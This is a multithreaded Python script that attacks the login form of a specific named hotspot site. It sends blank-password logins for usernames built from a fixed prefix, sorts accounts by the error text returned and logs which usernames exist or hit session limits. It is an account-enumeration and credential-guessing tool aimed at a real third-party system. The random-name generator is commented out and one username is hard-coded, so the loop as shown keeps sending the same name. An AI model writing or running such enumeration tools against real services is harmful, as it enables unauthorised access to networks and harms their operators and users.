import requests
import random
import string
import time
import threading
from pathlib import Path

# CONFIGURATION
URL = "http://atbuhotspot.net/login"
HEADERS = {
    "Host": "atbuhotspot.net",
    "Origin": "http://atbuhotspot.net",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Referer": "http://atbuhotspot.net/login",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Connection": "keep-alive",
}

DST      = ""   # or your real dst+popup params
POPUP    = "true"
SUBMIT   = "+"  # the value of the submit button, if any

PREFIX   = "RSTG"
CHARS    = string.ascii_uppercase + string.digits
MAX_THREADS = 10    # adjust to your CPU / network

# file paths
tested_file      = Path("tested.txt")
nonexistent_file = Path("nonexistent.txt")
session_file     = Path("session_limited.txt")

# ensure files exist
for f in (tested_file, nonexistent_file, session_file):
    f.touch(exist_ok=True)

# load already‑tested usernames into a set
tested = set(tested_file.read_text().split())

lock = threading.Lock()

def get_next_username():
    """Generate a new RSTG#### username not already in `tested`."""
    while True:
        suffix = "".join(random.choices(CHARS, k=4))
        # uname = PREFIX + suffix
        uname = "RSTG98AO"
        with lock:
            if uname not in tested:
                return uname


def try_username():
    uname = get_next_username()
    data = {
        "dst": DST,
        "popup": POPUP,
        "username": uname,
        "password": "",       # blank password
        "submit": SUBMIT
    }

    try:
        resp = requests.post(URL, headers=HEADERS, data=data, timeout=5)
    except Exception as e:
        print(f"[!] Network error for {uname}: {e}")
        return

    body = resp.text.lower()
    if "username doesn&#039;t exist:" in body:
        print(body)
        print(f"[–] {uname} ⇒ username doesn’t exist")
        out = nonexistent_file
    elif "username or password wrong." in body:
        print(body)
    #elif "no more sessions are allowed for user" or "Username or Password wrong." in body:
        print(f"[+] {uname} ⇒ session limit hit or GOT SOMETHING")
        out = session_file
    else:
        print(body)
        print(f"[?] {uname} ⇒ unexpected or timeout response (status {resp.status_code})")
        return

    # record only "tested" if recognized category
    with lock:
        tested.add(uname)
        tested_file.open("a").write(uname + "\n")
        out.open("a").write(uname + "\n")


def worker_loop():
    while True:
        try_username()
        time.sleep(1)   # throttle: 10 req/s per thread

if __name__ == "__main__":
    threads = []
    for _ in range(MAX_THREADS):
        t = threading.Thread(target=worker_loop, daemon=True)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()  # run until manually stopped or keyspace exhausted
